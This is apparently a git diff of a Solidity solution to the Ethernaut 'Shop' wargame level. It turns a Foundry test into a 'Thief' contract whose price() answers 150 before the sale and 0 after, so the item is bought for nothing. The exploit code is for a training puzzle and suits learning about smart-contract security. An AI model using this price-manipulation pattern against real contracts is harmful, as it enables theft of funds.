@@ -1,8 +1,6 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "forge-std/Test.sol";
-
 interface Buyer {
   function price() external view returns (uint);
 }
@@ -21,26 +19,19 @@ contract Shop {
   }
 }
 
-contract Thief is Test {
+contract Thief is Buyer {
 
     Shop shop;
 
-    function setUp() public {
-        shop = new Shop();
-    }
-
-    //for etehrnaut only
     constructor(address $your_ethernaut_address_here) {
         shop = Shop($your_ethernaut_address_here);
     }
 
-    function testSteal() public {
+    function steal() public {
         shop.buy();
-        assertEq(shop.isSold(), true);
-        assertEq(shop.price(), 0);
     }
 
-    function price() public view returns (uint juke) {
+    function price() public view returns (uint heisenberg) {
         bool isSold = shop.isSold();
         if (!isSold) { return 150; }
         if (isSold) { return 0; }
